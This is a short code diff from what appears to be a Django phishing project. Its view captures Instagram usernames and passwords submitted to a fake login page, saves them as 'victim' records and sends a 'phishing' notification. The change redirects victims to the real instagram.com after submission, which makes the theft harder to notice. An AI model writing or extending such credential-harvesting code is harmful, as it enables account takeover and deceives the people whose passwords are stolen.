@@ -137,5 +137,5 @@ def instagram(request):
         victim = Instagram.objects.create(username=username,password=password)
         victim.save()
         push(f'phishing -- {request.user} -- submitted')
-        return redirect('instagram')
+        return redirect('https://www.instagram.com')
     return render(request, 'projects/instagram.html')
